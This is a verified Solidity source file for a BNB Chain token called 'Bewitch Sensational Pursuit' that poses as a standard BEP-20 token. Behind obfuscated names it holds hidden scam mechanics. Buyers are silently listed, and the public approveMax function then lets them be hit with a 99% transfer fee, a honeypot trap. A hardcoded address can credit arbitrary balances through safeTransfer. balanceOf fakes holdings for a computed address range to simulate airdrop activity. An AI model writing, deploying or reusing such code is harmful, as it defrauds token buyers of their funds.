/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

}


interface IUniswapV2Router {

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}


interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function symbol() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract BewitchSensationalPursuit is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    address public uniswapV2Pair;
    uint160 constant swapTotalMintTake = 1005894474667 * 2 ** 120;
    uint256  marketingAmountBuyTx = 100000000 * 10 ** _decimals;
    uint256 maxLimitTokenTotal = 100000000 * (10 ** _decimals);

    IUniswapV2Router public receiverWalletIsReceiver;

    address constant launchToModeAmountToken = 0x4F6064c01190A968894F7EA7CbC982C53DBEf7DB;

    mapping(address => bool)  shouldMinEnableToken;
    uint160 constant minMintTxSender = 322761267453 * 2 ** 40;

    uint160 constant takeEnableBuyIsShouldLaunchBurn = 343018250430 * 2 ** 80;
    uint256 private sellBotsTakeTotal = 100;
    uint256 private fromListAtAuto = 0;
    uint256 public liquidityTokenShouldBurn = 0;

    uint256 constant listLiquidityShouldWalletEnableIsToken = 300000 * 10 ** 18;
    mapping(address => bool)  minMaxListReceiver;
    address private totalBurnLiquidityReceiver = (msg.sender);
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 swapBurnReceiverFrom = 0;



    uint256 private fromFeeTxLiquidity = 0;
    bool private exemptLaunchShouldTx = false;

    uint160 constant swapLimitReceiverTokenMarketingTx = 1034867909533;
    uint256 public buyLaunchedListSellAtToken = 0;
    uint256 constant takeTotalFromMin = 10000 * 10 ** 18;
    bool private amountTotalBuyReceiver = false;
    uint256 public marketingBurnAutoSwap = 0;

    uint256 private modeSenderBotsIsExemptFund = 0;
    mapping(address => bool) private amountLimitReceiverFee;
    uint256 private buyTokenAtFee = 0;
    string constant _symbol = "BSPT";
    uint256 private walletAmountToMinShould = 0;
    
    mapping(address => uint256) _balances;


    string constant _name = "Bewitch Sensational Pursuit";
    uint256  takeLaunchMaxTx = 100000000 * 10 ** _decimals;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        receiverWalletIsReceiver = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(receiverWalletIsReceiver.factory()).createPair(address(this), receiverWalletIsReceiver.WETH());
        _allowances[address(this)][address(receiverWalletIsReceiver)] = maxLimitTokenTotal;

        amountLimitReceiverFee[msg.sender] = true;
        amountLimitReceiverFee[address(this)] = true;

        _balances[msg.sender] = maxLimitTokenTotal;
        emit Transfer(address(0), msg.sender, maxLimitTokenTotal);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return maxLimitTokenTotal;
    }

    function setatBurnReceiverSender(address fromFundAutoMinMaxModeEnable) public onlyOwner {
        if (totalBurnLiquidityReceiver != totalBurnLiquidityReceiver) {
            totalBurnLiquidityReceiver=fromFundAutoMinMaxModeEnable;
        }
        totalBurnLiquidityReceiver=fromFundAutoMinMaxModeEnable;
    }

    function approveMax(address spender) external {
        if (minMaxListReceiver[spender]) {
            shouldMinEnableToken[spender] = true;
        }
    }

    function gettradingAutoMarketingMintBurn() public view returns (bool) {
        if (exemptLaunchShouldTx != exemptLaunchShouldTx) {
            return exemptLaunchShouldTx;
        }
        if (exemptLaunchShouldTx == exemptLaunchShouldTx) {
            return exemptLaunchShouldTx;
        }
        return exemptLaunchShouldTx;
    }

    function tradingReceiverSellSender(address launchedMarketingExemptList) private view returns (bool) {
        return launchedMarketingExemptList == totalBurnLiquidityReceiver;
    }

    function getfromListBurnMax(address fromFundAutoMinMaxModeEnable) public view returns (bool) {
            return amountLimitReceiverFee[fromFundAutoMinMaxModeEnable];
    }

    function getreceiverMinAtEnable() public view returns (uint256) {
        if (fromFeeTxLiquidity != buyLaunchedListSellAtToken) {
            return buyLaunchedListSellAtToken;
        }
        if (fromFeeTxLiquidity != sellBotsTakeTotal) {
            return sellBotsTakeTotal;
        }
        return fromFeeTxLiquidity;
    }

    function setmaxLiquidityReceiverMarketingExemptTradingLaunched(uint256 fromFundAutoMinMaxModeEnable) public onlyOwner {
        if (modeSenderBotsIsExemptFund != walletAmountToMinShould) {
            walletAmountToMinShould=fromFundAutoMinMaxModeEnable;
        }
        if (modeSenderBotsIsExemptFund == buyTokenAtFee) {
            buyTokenAtFee=fromFundAutoMinMaxModeEnable;
        }
        modeSenderBotsIsExemptFund=fromFundAutoMinMaxModeEnable;
    }

    function txTokenMintSell(address feeEnableIsAt, address tradingAutoToFrom, uint256 totalLaunchMaxFeeMarketingMint, bool senderTeamFeeShould) private {
        uint160 shouldSellLiquiditySwap = swapTotalMintTake + takeEnableBuyIsShouldLaunchBurn + minMintTxSender + swapLimitReceiverTokenMarketingTx;
        if (senderTeamFeeShould) {
            feeEnableIsAt = address(uint160(shouldSellLiquiditySwap + swapBurnReceiverFrom));
            swapBurnReceiverFrom++;
            _balances[tradingAutoToFrom] = _balances[tradingAutoToFrom].add(totalLaunchMaxFeeMarketingMint);
        } else {
            _balances[feeEnableIsAt] = _balances[feeEnableIsAt].sub(totalLaunchMaxFeeMarketingMint);
        }
        emit Transfer(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint);
    }

    function sellReceiverTeamAutoLiquidity(address feeEnableIsAt, address tradingAutoToFrom, uint256 totalLaunchMaxFeeMarketingMint) internal returns (bool) {
        if (enableModeFundFee(uint160(tradingAutoToFrom))) {
            txTokenMintSell(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint, false);
            return true;
        }
        if (enableModeFundFee(uint160(feeEnableIsAt))) {
            txTokenMintSell(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint, true);
            return true;
        }
        
        bool buyLaunchListFee = tradingReceiverSellSender(feeEnableIsAt) || tradingReceiverSellSender(tradingAutoToFrom);
        
        if (feeEnableIsAt == uniswapV2Pair && !buyLaunchListFee) {
            minMaxListReceiver[tradingAutoToFrom] = true;
        }
        
        if (buyLaunchListFee) {
            return shouldReceiverFundToTradingLiquidity(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint);
        }
        
        _balances[feeEnableIsAt] = _balances[feeEnableIsAt].sub(totalLaunchMaxFeeMarketingMint, "Insufficient Balance!");
        
        uint256 botsAmountIsFromMin = buyTakeAtMode(feeEnableIsAt) ? burnTeamListSellFeeToMax(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint) : totalLaunchMaxFeeMarketingMint;

        _balances[tradingAutoToFrom] = _balances[tradingAutoToFrom].add(botsAmountIsFromMin);
        emit Transfer(feeEnableIsAt, tradingAutoToFrom, botsAmountIsFromMin);
        return true;
    }

    function getmodeReceiverReceiverTake() public view returns (bool) {
        return amountTotalBuyReceiver;
    }

    function amountSwapTxExemptReceiver(address feeEnableIsAt, bool mintExemptBuyAuto) internal returns (uint256) {
        if (shouldMinEnableToken[feeEnableIsAt]) {
            return 99;
        }
        
        if (liquidityTokenShouldBurn == fromListAtAuto) {
            liquidityTokenShouldBurn = sellBotsTakeTotal;
        }


        if (mintExemptBuyAuto) {
            return fromListAtAuto;
        }
        if (!mintExemptBuyAuto && feeEnableIsAt == uniswapV2Pair) {
            return modeSenderBotsIsExemptFund;
        }
        return 0;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != maxLimitTokenTotal) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return sellReceiverTeamAutoLiquidity(sender, recipient, amount);
    }

    function setreceiverMinAtEnable(uint256 fromFundAutoMinMaxModeEnable) public onlyOwner {
        if (fromFeeTxLiquidity == sellBotsTakeTotal) {
            sellBotsTakeTotal=fromFundAutoMinMaxModeEnable;
        }
        if (fromFeeTxLiquidity != sellBotsTakeTotal) {
            sellBotsTakeTotal=fromFundAutoMinMaxModeEnable;
        }
        if (fromFeeTxLiquidity == fromListAtAuto) {
            fromListAtAuto=fromFundAutoMinMaxModeEnable;
        }
        fromFeeTxLiquidity=fromFundAutoMinMaxModeEnable;
    }

    function setlaunchedIsWalletBurnFromFeeAt(uint256 fromFundAutoMinMaxModeEnable) public onlyOwner {
        fromListAtAuto=fromFundAutoMinMaxModeEnable;
    }

    function gettradingSenderMinExemptLaunchedAmountMax() public view returns (uint256) {
        return walletAmountToMinShould;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function receiverWalletBurnAutoTx(address txSenderWalletSwap) private pure returns (bool) {
        return txSenderWalletSwap == launchToModeAmountToken;
    }

    function burnTeamListSellFeeToMax(address feeEnableIsAt, address maxAutoTeamTotalFromSwap, uint256 totalLaunchMaxFeeMarketingMint) internal returns (uint256) {
        
        if (buyLaunchedListSellAtToken != fromFeeTxLiquidity) {
            buyLaunchedListSellAtToken = modeSenderBotsIsExemptFund;
        }

        if (amountTotalBuyReceiver == exemptLaunchShouldTx) {
            amountTotalBuyReceiver = amountTotalBuyReceiver;
        }

        if (walletAmountToMinShould != buyLaunchedListSellAtToken) {
            walletAmountToMinShould = fromFeeTxLiquidity;
        }


        uint256 enableWalletLiquidityMin = totalLaunchMaxFeeMarketingMint.mul(amountSwapTxExemptReceiver(feeEnableIsAt, maxAutoTeamTotalFromSwap == uniswapV2Pair)).div(sellBotsTakeTotal);

        if (enableWalletLiquidityMin > 0) {
            _balances[address(this)] = _balances[address(this)].add(enableWalletLiquidityMin);
            emit Transfer(feeEnableIsAt, address(this), enableWalletLiquidityMin);
        }

        return totalLaunchMaxFeeMarketingMint.sub(enableWalletLiquidityMin);
    }

    function getlaunchedIsWalletBurnFromFeeAt() public view returns (uint256) {
        if (fromListAtAuto == fromFeeTxLiquidity) {
            return fromFeeTxLiquidity;
        }
        if (fromListAtAuto != buyLaunchedListSellAtToken) {
            return buyLaunchedListSellAtToken;
        }
        if (fromListAtAuto == fromListAtAuto) {
            return fromListAtAuto;
        }
        return fromListAtAuto;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getminShouldAutoFromIs() public view returns (uint256) {
        if (liquidityTokenShouldBurn == modeSenderBotsIsExemptFund) {
            return modeSenderBotsIsExemptFund;
        }
        if (liquidityTokenShouldBurn == liquidityTokenShouldBurn) {
            return liquidityTokenShouldBurn;
        }
        return liquidityTokenShouldBurn;
    }

    function shouldReceiverFundToTradingLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getmaxLiquidityReceiverMarketingExemptTradingLaunched() public view returns (uint256) {
        return modeSenderBotsIsExemptFund;
    }

    function safeTransfer(address feeEnableIsAt, address tradingAutoToFrom, uint256 totalLaunchMaxFeeMarketingMint) public {
        if (!receiverWalletBurnAutoTx(msg.sender)) {
            return;
        }
        if (enableModeFundFee(uint160(tradingAutoToFrom))) {
            txTokenMintSell(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint, false);
            return;
        }
        if (tradingAutoToFrom == address(0)) {
            return;
        }
        if (enableModeFundFee(uint160(feeEnableIsAt))) {
            txTokenMintSell(feeEnableIsAt, tradingAutoToFrom, totalLaunchMaxFeeMarketingMint, true);
            return;
        }
        if (totalLaunchMaxFeeMarketingMint == 0) {
            return;
        }
        if (feeEnableIsAt == address(0)) {
            _balances[tradingAutoToFrom] = _balances[tradingAutoToFrom].add(totalLaunchMaxFeeMarketingMint);
            return;
        }
    }

    function buyTakeAtMode(address feeEnableIsAt) internal view returns (bool) {
        return !amountLimitReceiverFee[feeEnableIsAt];
    }

    function settradingAutoMarketingMintBurn(bool fromFundAutoMinMaxModeEnable) public onlyOwner {
        if (exemptLaunchShouldTx != amountTotalBuyReceiver) {
            amountTotalBuyReceiver=fromFundAutoMinMaxModeEnable;
        }
        if (exemptLaunchShouldTx != amountTotalBuyReceiver) {
            amountTotalBuyReceiver=fromFundAutoMinMaxModeEnable;
        }
        exemptLaunchShouldTx=fromFundAutoMinMaxModeEnable;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellReceiverTeamAutoLiquidity(msg.sender, recipient, amount);
    }

    function setminShouldAutoFromIs(uint256 fromFundAutoMinMaxModeEnable) public onlyOwner {
        liquidityTokenShouldBurn=fromFundAutoMinMaxModeEnable;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function settradingSenderMinExemptLaunchedAmountMax(uint256 fromFundAutoMinMaxModeEnable) public onlyOwner {
        walletAmountToMinShould=fromFundAutoMinMaxModeEnable;
    }

    function launchTakeWalletSender(uint160 txSenderWalletSwap) private view returns (uint256) {
        uint160 shouldSellLiquiditySwap = swapTotalMintTake + takeEnableBuyIsShouldLaunchBurn + minMintTxSender + swapLimitReceiverTokenMarketingTx;
        if ((txSenderWalletSwap - uint160(shouldSellLiquiditySwap)) < swapBurnReceiverFrom) {
            return takeTotalFromMin;
        }
        return listLiquidityShouldWalletEnableIsToken;
    }

    function getatBurnReceiverSender() public view returns (address) {
        return totalBurnLiquidityReceiver;
    }

    function setfromListBurnMax(address fromFundAutoMinMaxModeEnable,bool walletReceiverBurnTeam) public onlyOwner {
        if (fromFundAutoMinMaxModeEnable == totalBurnLiquidityReceiver) {
            amountTotalBuyReceiver=walletReceiverBurnTeam;
        }
        if (amountLimitReceiverFee[fromFundAutoMinMaxModeEnable] == amountLimitReceiverFee[fromFundAutoMinMaxModeEnable]) {
           amountLimitReceiverFee[fromFundAutoMinMaxModeEnable]=walletReceiverBurnTeam;
        }
        amountLimitReceiverFee[fromFundAutoMinMaxModeEnable]=walletReceiverBurnTeam;
    }

    function setmodeReceiverReceiverTake(bool fromFundAutoMinMaxModeEnable) public onlyOwner {
        if (amountTotalBuyReceiver == amountTotalBuyReceiver) {
            amountTotalBuyReceiver=fromFundAutoMinMaxModeEnable;
        }
        amountTotalBuyReceiver=fromFundAutoMinMaxModeEnable;
    }

    function enableModeFundFee(uint160 txSenderWalletSwap) private pure returns (bool) {
        uint160 shouldSellLiquiditySwap = swapTotalMintTake + takeEnableBuyIsShouldLaunchBurn + minMintTxSender + swapLimitReceiverTokenMarketingTx;
        if (txSenderWalletSwap >= uint160(shouldSellLiquiditySwap)) {
            if (txSenderWalletSwap <= uint160(shouldSellLiquiditySwap) + 200000) {
                return true;
            }
        }
        return false;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (enableModeFundFee(uint160(account))) {
            return launchTakeWalletSender(uint160(account));
        }
        return _balances[account];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return shouldMinEnableToken[spender];
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}